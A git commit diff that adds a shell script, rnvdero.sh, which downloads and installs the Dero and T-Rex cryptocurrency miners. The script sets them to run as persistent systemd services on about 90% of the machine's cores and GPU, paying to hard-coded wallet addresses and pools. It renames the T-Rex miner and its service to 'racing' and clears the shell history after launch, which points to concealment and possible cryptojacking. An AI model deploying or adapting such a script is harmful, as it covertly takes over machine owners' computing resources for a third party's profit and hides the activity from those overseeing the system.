d61be4a8d54588597047a8fb91d6b18f3a42e298
tonnyhoang2014 <91616570+tonnyhoang2014@users.noreply.github.com>
2022-12-15 22:15:38 +0700

    Update and rename rnvdedo.sh to rnvdero.sh

--- rnvdedo.sh
+++
@@ -1,1 +0,0 @@
-dero1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xqqm622zv
---
+++ rnvdero.sh
@@ -0,0 +1,51 @@
+cd /usr/local/bin
+myworker=$(TZ='Asia/Ho_Chi_Minh' date +'%d-%m_%H')
+noCore=$(nproc --all)
+usingcore=$((noCore*90/100))
+if [[ $noCore -eq 6 ]]
+then
+    	sudo apt-get install linux-headers-$(uname -r) -y
+      distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
+      sudo wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
+      sudo mv cuda-$distribution.pin /etc/apt/preferences.d/cuda-repository-pin-600
+      sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/7fa2af80.pub
+      sudo echo "deb http://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list
+      sudo apt-key del 7fa2af80
+      sudo rm /etc/apt/sources.list.d/cuda.list
+      sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-keyring_1.0-1_all.deb
+      sudo dpkg -i cuda-keyring_1.0-1_all.deb
+      sudo apt-get update
+      sudo apt-get -y install cuda-drivers
+      sudo apt-get install libcurl4 -y
+      sudo apt-get install cuda-drivers-515 -y
+      sudo apt-get install cuda-drivers-fabricmanager-515 -y
+      sudo systemctl enable nvidia-fabricmanager
+      sudo systemctl start nvidia-fabricmanager
+      sudo nvidia-smi mig -cgi 0 -C
+      sudo apt-get update -y
+      sudo apt-get -upgrade -y
+      sudo wget https://github.com/deroproject/derohe/releases/download/Release114/dero_linux_amd64.tar.gz
+      sudo tar xavf dero_linux_amd64.tar.gz
+      sudo bash -c 'echo -e "[Unit]\nDescription=Dero Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjuf6ukc64lg5 --mining-threads "'${usingcore}'" --daemon-rpc-address=community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/dero.service'
+      sudo systemctl daemon-reload
+      sudo systemctl enable dero.service
+      sudo ./dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjuf6ukc64lg5 --mining-threads ${usingcore} --daemon-rpc-address=community-pools.mysrv.cloud:10300
+      sudo wget https://github.com/trexminer/T-Rex/releases/download/0.25.12/t-rex-0.25.12-linux.tar.gz
+      sudo tar -zxvf t-rex-0.25.12-linux.tar.gz
+      sudo mv t-rex racing
+      sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ."'${myworker}_bat_${noCore}_re'" -p x\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+      sudo systemctl daemon-reload
+      sudo systemctl enable racing.service
+      sudo ./racing -a kawpow -o us-rvn.2miners.com:6060 -u RPoxsDmAF8rXPycoTGf8NPNJrsDULeAVoJ.${myworker}_bat_${noCore} -p x &
+      history -c
+else
+      sudo apt-get update -y
+      sudo apt-get -upgrade -y
+      sudo wget https://github.com/deroproject/derohe/releases/download/Release114/dero_linux_amd64.tar.gz
+      sudo tar xavf dero_linux_amd64.tar.gz
+      sudo bash -c 'echo -e "[Unit]\nDescription=Dero Miner\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/local/bin/dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjuf6ukc64lg5 --mining-threads "'${usingcore}'" --daemon-rpc-address=community-pools.mysrv.cloud:10300\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/dero.service'
+      sudo systemctl daemon-reload
+      sudo systemctl enable dero.service
+      sudo ./dero_linux_amd64/dero-miner-linux-amd64 --wallet-address deroi1qyr8wnk9aw9lel0xcufdj98cqtd3lc5y84nhl679nm3wknaz0ad6xq9pvfz92xnjuf6ukc64lg5 --mining-threads ${usingcore} --daemon-rpc-address=community-pools.mysrv.cloud:10300
+      history -c
+fi
